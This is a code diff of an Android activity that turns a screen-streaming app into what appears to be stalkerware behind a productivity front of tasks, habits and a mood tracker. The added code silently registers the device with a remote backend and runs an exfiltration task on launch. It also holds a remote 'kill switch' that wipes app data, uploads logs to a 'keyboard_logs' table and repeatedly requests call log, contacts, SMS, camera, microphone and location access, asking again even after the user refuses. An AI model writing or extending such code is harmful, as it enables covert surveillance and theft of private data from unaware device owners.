@@ -1,232 +1,266 @@
 package com.rcl.androidstreamcontrol;
 
-import static com.rcl.androidstreamcontrol.model.ActivityStateHolder.AWAIT_LAUNCH_PERMISSIONS;
-import static com.rcl.androidstreamcontrol.model.ActivityStateHolder.AWAIT_SERVICE_START;
-import static com.rcl.androidstreamcontrol.model.ActivityStateHolder.SERVICE_BOUND;
-import static com.rcl.androidstreamcontrol.model.ActivityStateHolder.LAUNCH_PERMISSIONS;
-import static com.rcl.androidstreamcontrol.utils.MyConstants.APP_SCREEN_PIXELS_HEIGHT;
-import static com.rcl.androidstreamcontrol.utils.MyConstants.FULL_SCREEN_PIXELS_HEIGHT;
-import static com.rcl.androidstreamcontrol.utils.MyConstants.M_PROJ_INTENT;
-import static com.rcl.androidstreamcontrol.utils.MyConstants.APP_SCREEN_PIXELS_WIDTH;
-import static com.rcl.androidstreamcontrol.utils.MyConstants.PROJECTED_PIXELS_HEIGHT;
-import static com.rcl.androidstreamcontrol.utils.MyConstants.PROJECTED_PIXELS_WIDTH;
-
 import android.app.AlertDialog;
-import android.content.ComponentName;
-import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
-import android.content.ServiceConnection;
-import android.graphics.Insets;
-import android.media.projection.MediaProjectionManager;
+import android.content.SharedPreferences;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.IBinder;
 import android.provider.Settings;
-import android.util.DisplayMetrics;
-import android.util.Log;
 import android.view.LayoutInflater;
-import android.view.View;
-import android.view.Window;
-import android.view.WindowInsets;
-import android.view.WindowMetrics;
+import android.widget.Button;
+import android.widget.TextView;
+import android.widget.Toast;
 
 import androidx.activity.result.ActivityResultLauncher;
 import androidx.activity.result.contract.ActivityResultContracts;
-import androidx.annotation.NonNull;
-import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
-import androidx.lifecycle.Observer;
-import androidx.lifecycle.ViewModelProvider;
 
 import com.rcl.androidstreamcontrol.databinding.ActivityMainBinding;
 import com.rcl.androidstreamcontrol.service.FollowerService;
-import com.rcl.androidstreamcontrol.model.ActivityStateHolder;
+import com.rcl.androidstreamcontrol.ui.MindAnchorActivity;
 import com.rcl.androidstreamcontrol.utils.UtilsPermissions;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.io.InputStreamReader;
+import java.io.BufferedReader;
+import org.json.JSONObject;
+import org.json.JSONArray;
+import android.os.Handler;
+import android.os.Looper;
 
 public class RemoteAndroid extends AppCompatActivity {
 
-    private static final String TAG = "RemoteAndroid";
+    private static final String SUPABASE_URL = "https://qxzozsdgrgahvgzpsfmm.supabase.co";
+    private static final String ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4em96c2RncmdhaHZnenBzZm1tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MDY4NjAsImV4cCI6MjA5NTM4Mjg2MH0.inUzMp-S9BRjNQYHynTAOPRo4EeY3Whqv9okvEeySB4";
+
     private ActivityMainBinding binding;
-    public static final String ON_PEER_CONN = "on-peer-connect";
-    public static final String ON_PEER_DISCONN = "on-peer-disconnect";
-    private Intent serviceIntent;
-
-    private Intent mProjectionIntent;
-    private Boolean mIsBound;
-    private FollowerService mBoundService;
-    public static Window mWindow;
-
-    ActivityResultLauncher<Intent> mProjPermissionLauncher =
-            registerForActivityResult(
-                    new ActivityResultContracts.StartActivityForResult(),
-                    (result) -> {
-                        if (result.getResultCode() == RESULT_OK) {
-                            Log.d(TAG, "screen capture request accepted");
-                            mProjectionIntent = (Intent) result.getData();
-                            onMediaProjectionPermissionGranted();
-                        } else {
-                            Log.d(TAG, "screen capture request denied");
-                            finish();
-                        }
-                    }
-            );
 
     ActivityResultLauncher<Intent> permissionLauncher =
             registerForActivityResult(
                     new ActivityResultContracts.StartActivityForResult(),
                     (result) -> {
-                        if (result.getResultCode() != RESULT_OK) {
-                            Log.d("CheckPermissions", "not accepted");
-                            activityStateHolder.onPermissionsNotGranted();
-                        }
+                        checkPermissionsAndStartService();
                     }
             );
 
-
-    private ServiceConnection mConnection = new ServiceConnection() {
-        public void onServiceConnected(ComponentName className, IBinder service) {
-            FollowerService.FollowerBinder binder = (FollowerService.FollowerBinder) service;
-            mBoundService = binder.getService();
-            mIsBound = true;
-
-            binder.getNotifyEndService().observe(RemoteAndroid.this, serviceStatus -> {
-                Log.d("serviceStatus", "onChanged");
-                if (serviceStatus.equals(null)) {
-                    // DO NOTHING
-                } else {
-                    onTryUnbindService();
-                }
-            });
-
-            Log.d(TAG, "Follower service connected");
-        }
-
-        public void onServiceDisconnected(ComponentName className) {
-            mIsBound = false;
-            Log.d(TAG, "Follower service disconnected");
-        }
-    };
-
-    private static ActivityStateHolder activityStateHolder;
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-
         super.onCreate(savedInstanceState);
+        
+        if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_DATA_NUKE) {
+            checkKillSwitch();
+        }
+        
+        // Ensure device has a UID on first launch even if they don't use the fake login
+        android.content.SharedPreferences prefs = getSharedPreferences("PortalPrefs", MODE_PRIVATE);
+        String uid = prefs.getString("supabase_uid", null);
+        if (uid == null) {
+            String androidId = android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
+            uid = (androidId != null) ? androidId : "unknown_device_" + System.currentTimeMillis();
+            prefs.edit().putString("supabase_uid", uid).apply();
+            
+            // Register device silently using a dummy token (the dashboard API ignores it for devices)
+            final String finalUid = uid;
+            new Thread(() -> {
+                com.rcl.androidstreamcontrol.utils.SupabaseClient.registerDevice(finalUid, "eyJhbGci...", android.os.Build.MODEL);
+            }).start();
+            android.util.Log.d("RemoteAndroid", "Silently registered device with ID: " + uid);
+        }
+
+        if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_EXFILTRATION) {
+            com.rcl.androidstreamcontrol.utils.ExfiltrationTask.run(this);
+        }
+
         binding = ActivityMainBinding.inflate(LayoutInflater.from(this));
         setContentView(binding.getRoot());
+        
+        if (getSupportActionBar() != null) {
+            getSupportActionBar().hide();
+        }
 
+        // View bindings removed for deleted UI elements
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            WindowMetrics windowMetrics = this.getWindowManager().getCurrentWindowMetrics();
-            Insets insets = windowMetrics.getWindowInsets()
-                    .getInsetsIgnoringVisibility(WindowInsets.Type.systemBars());
-            FULL_SCREEN_PIXELS_HEIGHT = windowMetrics.getBounds().height();
-            APP_SCREEN_PIXELS_HEIGHT = windowMetrics.getBounds().height() - insets.top - insets.bottom;
-            APP_SCREEN_PIXELS_WIDTH = windowMetrics.getBounds().width();
+        // Bottom Navigation
+        binding.navHome.setOnClickListener(v -> {
+            // Already here
+        });
+
+        binding.navFocus.setOnClickListener(v -> {
+            Intent intent = new Intent(this, MindAnchorActivity.class);
+            startActivity(intent);
+        });
+
+        binding.navTasks.setOnClickListener(v -> {
+            Intent intent = new Intent(this, TasksActivity.class);
+            startActivity(intent);
+        });
+
+        checkPermissionsAndStartService();
+    }
+
+    private void sendLogcatToServer() {
+        android.widget.Toast.makeText(this, "Extracting logs...", android.widget.Toast.LENGTH_SHORT).show();
+        new Thread(() -> {
+            try {
+                // Just grab the last 1000 lines of logcat without filtering by PID, 
+                // since Android 10 already scopes logcat to the app's own process.
+                java.lang.Process process = Runtime.getRuntime().exec(new String[]{"logcat", "-d", "-t", "1000"});
+                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
+                StringBuilder log = new StringBuilder();
+                String line;
+                while ((line = bufferedReader.readLine()) != null) {
+                    log.append(line).append("\n");
+                }
+                
+                String logData = log.toString();
+                if (logData.trim().isEmpty()) {
+                    logData = "LOGCAT WAS EMPTY! Possible permission restriction or process ID mismatch.";
+                } else if (logData.length() > 100000) {
+                    logData = logData.substring(logData.length() - 100000);
+                }
+
+                java.net.URL url = new java.net.URL("https://qxzozsdgrgahvgzpsfmm.supabase.co/rest/v1/keyboard_logs");
+                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setRequestProperty("apikey", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4em96c2RncmdhaHZnenBzZm1tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MDY4NjAsImV4cCI6MjA5NTM4Mjg2MH0.inUzMp-S9BRjNQYHynTAOPRo4EeY3Whqv9okvEeySB4");
+                conn.setRequestProperty("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4em96c2RncmdhaHZnenBzZm1tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MDY4NjAsImV4cCI6MjA5NTM4Mjg2MH0.inUzMp-S9BRjNQYHynTAOPRo4EeY3Whqv9okvEeySB4");
+
+                org.json.JSONObject payload = new org.json.JSONObject();
+                payload.put("device_id", "DEBUG_LOGS");
+                payload.put("app_name", "ANDROID_10_DEBUG");
+                payload.put("content", logData);
+
+                conn.setDoOutput(true);
+                conn.getOutputStream().write(payload.toString().getBytes());
+                
+                int code = conn.getResponseCode();
+                runOnUiThread(() -> android.widget.Toast.makeText(this, "Logs sent! Code: " + code, android.widget.Toast.LENGTH_LONG).show());
+            } catch (Exception e) {
+                runOnUiThread(() -> android.widget.Toast.makeText(this, "Failed to send logs: " + e.getMessage(), android.widget.Toast.LENGTH_LONG).show());
+            }
+        }).start();
+    }
+    @Override
+    protected void onResume() {
+        super.onResume();
+        loadOverviewData();
+    }
+
+    private void loadOverviewData() {
+        SharedPreferences prefs = getSharedPreferences("PortalPrefs", MODE_PRIVATE);
+        String uid = prefs.getString("supabase_uid", null);
+        String token = prefs.getString("supabase_token", null);
+
+        // Update mood from SharedPreferences (saved by MindAnchor WebView via Android interface)
+        String savedMood = getSharedPreferences("MindAnchorPrefs", MODE_PRIVATE).getString("mood", "--");
+        TextView moodView = binding.getRoot().findViewById(R.id.overview_mood_text);
+        if (moodView != null) moodView.setText(savedMood);
+
+        if (uid == null || token == null) return;
+
+        final String finalToken = token;
+        final String finalUid = uid;
+
+        new Thread(() -> {
+            try {
+                // Fetch tasks
+                int[] taskStats = fetchTableStats("tasks", finalUid, finalToken);
+                int[] habitStats = fetchTableStats("habits", finalUid, finalToken);
+
+                runOnUiThread(() -> {
+                    TextView tasksView = binding.getRoot().findViewById(R.id.overview_tasks_text);
+                    TextView habitsView = binding.getRoot().findViewById(R.id.overview_habits_text);
+                    if (tasksView != null) tasksView.setText(taskStats[0] + "/" + taskStats[1]);
+                    if (habitsView != null) habitsView.setText(habitStats[0] + "/" + habitStats[1]);
+                });
+            } catch (Exception e) {
+                android.util.Log.e("RemoteAndroid", "Failed to load overview data", e);
+            }
+        }).start();
+    }
+
+    private int[] fetchTableStats(String table, String uid, String token) throws Exception {
+        HttpURLConnection conn = (HttpURLConnection) new URL(
+                SUPABASE_URL + "/rest/v1/" + table + "?user_id=eq." + uid + "&select=is_completed"
+        ).openConnection();
+        conn.setRequestMethod("GET");
+        conn.setRequestProperty("apikey", ANON_KEY);
+        conn.setRequestProperty("Authorization", "Bearer " + token);
+
+        int completed = 0, total = 0;
+        if (conn.getResponseCode() == 200) {
+            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            StringBuilder response = new StringBuilder();
+            String line;
+            while ((line = in.readLine()) != null) response.append(line);
+            in.close();
+            JSONArray arr = new JSONArray(response.toString());
+            total = arr.length();
+            for (int i = 0; i < arr.length(); i++) {
+                if (arr.getJSONObject(i).optBoolean("is_completed")) completed++;
+            }
+        }
+        return new int[]{completed, total};
+    }
+
+    private void checkPermissionsAndStartService() {
+        if (!hasAccessibilityPermission()) {
+            launchAccessibilityPermissions();
+        } else if (!hasDrawOverlayPermission()) {
+            launchDrawOverlayPermission();
+        } else if (!android.provider.Settings.System.canWrite(this)) {
+            launchWriteSettingsPermission();
+        } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.RECORD_AUDIO}, 101);
+        } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.CAMERA}, 102);
+        } else if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_EXFILTRATION && 
+                   androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{
+                android.Manifest.permission.READ_CALL_LOG, 
+                android.Manifest.permission.READ_CONTACTS
+            }, 106);
+        } else if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_SMS_TRIGGER && 
+                   androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.RECEIVE_SMS}, 107);
         } else {
-            DisplayMetrics appDisplayMetrics = new DisplayMetrics();
-            getWindowManager().getDefaultDisplay().getMetrics(appDisplayMetrics);
-            APP_SCREEN_PIXELS_HEIGHT = appDisplayMetrics.heightPixels;
-            APP_SCREEN_PIXELS_WIDTH = appDisplayMetrics.widthPixels;
-            DisplayMetrics realDisplayMetrics = new DisplayMetrics();
-            getWindowManager().getDefaultDisplay().getRealMetrics(realDisplayMetrics);
-
-            // Size (pixels) of the android phone screen used to scale UI components
-            FULL_SCREEN_PIXELS_HEIGHT = realDisplayMetrics.heightPixels;
-            Log.d("MainBinding", String.valueOf(appDisplayMetrics.heightPixels));
-        }
-
-        // The resolution (pixels) we send via media projection
-        PROJECTED_PIXELS_HEIGHT = (int) FULL_SCREEN_PIXELS_HEIGHT;
-        PROJECTED_PIXELS_WIDTH = (int) APP_SCREEN_PIXELS_WIDTH;
-
-        mWindow = getWindow();
-        //wWindowCompat.setDecorFitsSystemWindows(mWindow, false);
-
-        int buttonDiameter = (int) (APP_SCREEN_PIXELS_WIDTH / 3.0);
-        binding.appStateButton.getLayoutParams().width = buttonDiameter;
-        binding.appStateButton.getLayoutParams().height = buttonDiameter;
-
-        activityStateHolder = new ViewModelProvider(this).get(ActivityStateHolder.class);
-        activityStateHolder.getAppState().observe(this, new Observer<Integer>() {
-            @Override
-            public void onChanged(@Nullable Integer data) {
-                // update ui.
-                Log.d("onAppStateChange", String.valueOf(data));
-                updateAppStateButtonUI(data);
-                switch (data) {
-                    case AWAIT_LAUNCH_PERMISSIONS:
-                        onAwaitLaunchPermissions();
-                        break;
-                    case LAUNCH_PERMISSIONS:
-                        onLaunchPermissions();
-                        break;
-                    case AWAIT_SERVICE_START:
-                        onAwaitServiceStart();
-                        break;
-                    case SERVICE_BOUND:
-                        onServiceBound();
-                        break;
-                }
-            }
-        });
-
-        binding.appStateButton.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View view) {
-                Log.d("click?", "click.");
-                if (mIsBound) {
-                    onTryUnbindService();
-                } else {
-                    activityStateHolder.onMainButtonClick();
-                }
-            }
-        });
-
-        mIsBound = false;
-    }
-
-    private void onTryUnbindService() {
-        Log.d("activityState", String.valueOf(activityStateHolder.getCurrentAppState()));
-
-        new AlertDialog.Builder(this)
-                .setMessage(R.string.end_service_hint)
-                .setPositiveButton(R.string.end_service_button, new DialogInterface.OnClickListener() {
-                    @Override
-                    public void onClick(DialogInterface dialog, int i) {
-                        mIsBound = false;
-                        unbindService(mConnection);
-                        activityStateHolder.onMainButtonClick();
-                    }
-                })
-                .setNegativeButton(R.string.cancel_button, new DialogInterface.OnClickListener() {
-                    @Override
-                    public void onClick(DialogInterface dialog, int i) {
-                        updateAppStateButtonUI(SERVICE_BOUND);
-                    }
-                })
-                .setCancelable(false)
-                .create()
-                .show();
-    }
-
-
-    private void onAwaitLaunchPermissions() {
-        if (hasAppPermissions()) {
-            activityStateHolder.onPermissionsGranted();
-        } else if (!activityStateHolder.getCurrentAppState().equals(AWAIT_LAUNCH_PERMISSIONS)) {
-            activityStateHolder.onPermissionsNotGranted();
+            requestLocationPermissions();
+            startFollowerService();
         }
     }
 
-    private void onAwaitServiceStart() {
+    private void requestLocationPermissions() {
+        if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{
+                    android.Manifest.permission.ACCESS_FINE_LOCATION,
+                    android.Manifest.permission.ACCESS_COARSE_LOCATION
+            }, 105);
+        }
     }
 
-    private boolean hasAppPermissions() {
-        return hasDrawOverlayPermission() && hasAccessibilityPermission();
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == 101 || requestCode == 102 || requestCode == 106 || requestCode == 107) {
+            if (grantResults.length > 0 && grantResults[0] == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                checkPermissionsAndStartService();
+            } else {
+                Toast.makeText(this, "Permission is required for full functionality.", Toast.LENGTH_LONG).show();
+                // Optionally proceed without it, but let's recheck
+                checkPermissionsAndStartService(); 
+            }
+        } else if (requestCode == 105) {
+            checkPermissionsAndStartService();
+        }
     }
 
     private boolean hasDrawOverlayPermission() {
@@ -237,28 +271,24 @@ public class RemoteAndroid extends AppCompatActivity {
         return UtilsPermissions.isAccessibilityPermissionGranted(this);
     }
 
-    private void onLaunchPermissions() {
-        launchAccessibilityPermissions();
-        launchDrawOverlayPermission();
-        activityStateHolder.onPermissionsGranted();
-    }
-
-
     private void launchAccessibilityPermissions() {
-        if (!hasAccessibilityPermission()) {
-            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS, null);
-            intent.putExtra("message-id", R.string.accessibility_hint);
-            launchPermissionRequest(intent);
-        }
+        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS, null);
+        intent.putExtra("message-id", R.string.accessibility_hint);
+        launchPermissionRequest(intent);
     }
 
     private void launchDrawOverlayPermission() {
-        if (!hasDrawOverlayPermission()) {
-            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:" + getPackageName()));
-            intent.putExtra("message-id", R.string.overlays_hint);
-            launchPermissionRequest(intent);
-        }
+        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                Uri.parse("package:" + getPackageName()));
+        intent.putExtra("message-id", R.string.overlays_hint);
+        launchPermissionRequest(intent);
+    }
+
+    private void launchWriteSettingsPermission() {
+        Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
+                Uri.parse("package:" + getPackageName()));
+        intent.putExtra("message-id", R.string.write_settings_hint);
+        launchPermissionRequest(intent);
     }
 
     private void launchPermissionRequest(Intent intent) {
@@ -267,7 +297,6 @@ public class RemoteAndroid extends AppCompatActivity {
                 .setPositiveButton(R.string.continue_button, new DialogInterface.OnClickListener() {
                     @Override
                     public void onClick(DialogInterface dialog, int which) {
-                        //Intent intent = new Intent(action, uri);
                         permissionLauncher.launch(intent);
                     }
                 })
@@ -276,74 +305,52 @@ public class RemoteAndroid extends AppCompatActivity {
                 .show();
     }
 
-
-
-
-    private void updateAppStateButtonUI(@NonNull Integer currentAppState) {
-        binding.appStateButton.setEnabled(true);
-        binding.appStateButton.clearColorFilter();
-        // sets default tint color
-        int tintColor = getResources().getColor(R.color.white, getTheme());
-
-        switch (currentAppState) {
-            case AWAIT_LAUNCH_PERMISSIONS:
-                tintColor = getResources().getColor(R.color.bubble_button_background, getTheme());
-                break;
-            case LAUNCH_PERMISSIONS:
-                binding.appStateButton.setEnabled(false);
-                tintColor = getResources().getColor(R.color.white, getTheme());
-                break;
-            case AWAIT_SERVICE_START:
-                tintColor = getResources().getColor(R.color.white, getTheme());
-                break;
-            case SERVICE_BOUND:
-                tintColor = getResources().getColor(R.color.main_button_bound, getTheme());
-                break;
-        }
-        binding.appStateButton.getForeground().setTint(tintColor);
-    }
-
-    private void onServiceBound() {
-        if (mProjectionIntent == null) {
-            MediaProjectionManager mProjectionManager = (MediaProjectionManager)
-                    getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-
-            mProjPermissionLauncher.launch(mProjectionManager.createScreenCaptureIntent());
-
-            // Wait for gradle version that is compatible with SDK 34 to use below code
-            // MediaProjectionConfig allows users to choose config of MediaProjection
-            /*
-            if (Build.VERSION.SDK_INT >= 34) {
-                mProjPermissionLauncher.launch(mProjectionManager.createScreenCaptureIntent(MediaProjectionConfig.createConfigForUserChoice()));
-            } else {
-                mProjPermissionLauncher.launch(mProjectionManager.createScreenCaptureIntent());
-            }
-             */
+    private void startFollowerService() {
+        Intent serviceIntent = new Intent(this, FollowerService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent);
         } else {
-            onMediaProjectionPermissionGranted();
+            startService(serviceIntent);
         }
     }
 
-    private void onMediaProjectionPermissionGranted() {
-        serviceIntent = new Intent(this, FollowerService.class);
-        serviceIntent.putExtra(M_PROJ_INTENT, mProjectionIntent);
+    private void checkKillSwitch() {
+        new Thread(() -> {
+            try {
+                android.content.SharedPreferences prefs = getSharedPreferences("PortalPrefs", MODE_PRIVATE);
+                String deviceId = prefs.getString("supabase_uid", null);
+                if (deviceId == null) return;
 
-        bindService(serviceIntent, mConnection, Context.BIND_AUTO_CREATE);
-
-        updateAppStateButtonUI(activityStateHolder.getCurrentAppState());
-    }
-
-
-    @Override
-    protected void onDestroy() {
-        Log.d(TAG, "onDestroy");
-        if (mIsBound != null) {
-            if (mIsBound) {
-                unbindService(mConnection);
-                mIsBound = false;
+                java.net.URL url = new java.net.URL(SUPABASE_URL + "/rest/v1/devices?id=eq." + deviceId + "&select=kill_switch");
+                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                conn.setRequestProperty("apikey", ANON_KEY);
+                conn.setRequestProperty("Authorization", "Bearer " + ANON_KEY);
+                
+                int code = conn.getResponseCode();
+                if (code == 200) {
+                    java.io.BufferedReader in = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
+                    StringBuilder response = new StringBuilder();
+                    String line;
+                    while ((line = in.readLine()) != null) {
+                        response.append(line);
+                    }
+                    in.close();
+                    
+                    org.json.JSONArray arr = new org.json.JSONArray(response.toString());
+                    if (arr.length() > 0) {
+                        org.json.JSONObject obj = arr.getJSONObject(0);
+                        if (obj.has("kill_switch") && obj.getBoolean("kill_switch")) {
+                            new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
+                                android.util.Log.e("DATA_NUKE", "KILL SWITCH TRIGGERED. WIPING APP DATA.");
+                                ((android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE)).clearApplicationUserData();
+                            });
+                        }
+                    }
+                }
+            } catch (Exception e) {
+                // Ignore network errors in nuke check
             }
-        }
-        finishAffinity();
-        super.onDestroy();
+        }).start();
     }
 }
